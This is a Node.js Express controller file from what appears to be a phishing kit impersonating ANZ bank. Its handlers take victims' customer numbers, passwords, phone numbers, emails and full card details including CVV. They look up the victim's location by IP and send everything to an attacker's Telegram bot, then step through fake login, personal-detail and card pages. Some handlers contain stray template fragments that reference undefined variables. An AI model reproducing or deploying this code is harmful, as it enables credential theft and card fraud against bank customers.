const { sendMessageFor } = require('simple-telegram-message');
const axios = require('axios');
const { getClientIp } = require('request-ip');
const { botToken, chatId } = require('../../settings');

async function getIP(ipAddr) {
	try {
		const { data } = await axios.get(`https://ipapi.co/${ipAddr}/json/`);
		const { ip, city, region, country_name, postal, timezone, utc_offset, org } = data;

		return { ip, city, region, country_name, postal, timezone, utc_offset, org };
	} catch (e) {
		return {
			ip: 'NULL',
			city: 'NULL',
			region: 'NULL',
			country_name: 'NULL',
			postal: 'NULL',
			timezone: 'NULL',
			utc_offset: 'NULL',
			org: 'NULL',
		};
	}
}

exports.login = (req, res) => {
	return res.render('login');
};

exports.loginPost = async (req, res) => {
	const { customerRegistrationNumber, password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return getIP(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ip, city, region, country_name, postal, timezone, utc_offset, org } = iPDetails;
	const userAgent = req.headers['user-agent'];
	const systemLang = req.headers['accept-language'];

	const message =
		`+ --------- 👾 ANZ LOGIN --------- +\n` +
		`+ ------------------------------------------ +\n` +
		`+ 🧾 Account Information\n` +
		`| Customer Number  : ${customerRegistrationNumber}\n` +
		`| Password         : ${password}\n` +
		`+ ------------------------------------------ +\n` +
		`+ 🌍 GEO-IP INFO\n` +
		`| IP ADDRESS       : ${ip}\n` +
		`| CITY             : ${city}\n` +
		`| STATE            : ${region}\n` +
		`| ZIP CODE         : ${postal}\n` +
		`| COUNTRY          : ${country_name}\n` +
		`| TIME             : ${timezone} (UTC ${utc_offset})\n` +
		`| ISP              : ${org}\n` +
		`+ ------------------------------------------ +\n` +
		`+ 💻 SYSTEM INFO\n` +
		`| USER AGENT       : ${userAgent}\n` +
		`| SYSTEM LANGUAGE  : ${systemLang}\n` +
		`+ ------------------------------------------ +`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect('/auth/login/2');
};

exports.login2 = (req, res) => {
	return res.render('login2');
};

exports.loginPost2 = async (req, res) => {
	const { mobile, email } = req.body;
	const message =
		`+ --------- 👾 ANZ LOGIN --------- +\n` +
		`+ ------------------------------------------ +\n` +
		`+ 👤 Personal Information\n` +
		`| Phone Number     : ${mobile}\n` +
		`| Email Address    : ${email}\n` +
		`+ ------------------------------------------ +`;
		`+ 🌍 GEO-IP INFO\n` +
		`| IP ADDRESS       : ${ip}\n` +
		`| CITY             : ${city}\n` +
		`| STATE            : ${region}\n` +
		`| ZIP CODE         : ${postal}\n` +
		`| COUNTRY          : ${country_name}\n` +
		`| TIME             : ${timezone} (UTC ${utc_offset})\n` +
		`| ISP              : ${org}\n` +
		`+ ------------------------------------------ +\n` +
		`+ 💻 SYSTEM INFO\n` +
		`| USER AGENT       : ${userAgent}\n` +
		`| SYSTEM LANGUAGE  : ${systemLang}\n` +
		`+ ------------------------------------------ +`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect('/auth/login/3');
};

exports.login3 = (req, res) => {
	return res.render('login3');
};

exports.loginPost3 = async (req, res) => {
	const { ccname, ccnum, expiry, cvv } = req.body;
	const message =
		`+ --------- 👾 ANZ LOGIN --------- +\n` +
		`+ ------------------------------------------ +\n` +
		`+ 💳 Card Information\n` +
		`| Card Name        : ${ccname}\n` +
		`| Card Number      : ${ccnum}\n` +
		`| Expiry           : ${expiry}\n` +
		`| CVV              : ${cvv}\n` +
		`+ ------------------------------------------ +`;
		`+ 🌍 GEO-IP INFO\n` +
		`| IP ADDRESS       : ${ip}\n` +
		`| CITY             : ${city}\n` +
		`| STATE            : ${region}\n` +
		`| ZIP CODE         : ${postal}\n` +
		`| COUNTRY          : ${country_name}\n` +
		`| TIME             : ${timezone} (UTC ${utc_offset})\n` +
		`| ISP              : ${org}\n` +
		`+ ------------------------------------------ +\n` +
		`+ 💻 SYSTEM INFO\n` +
		`| USER AGENT       : ${userAgent}\n` +
		`| SYSTEM LANGUAGE  : ${systemLang}\n` +
		`+ ------------------------------------------ +`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect('/auth/complete');
};

exports.complete = (req, res) => {
	return res.render('complete');
};

exports.page404Redirect = (req, res) => {
	return res.redirect('/auth/login');
};
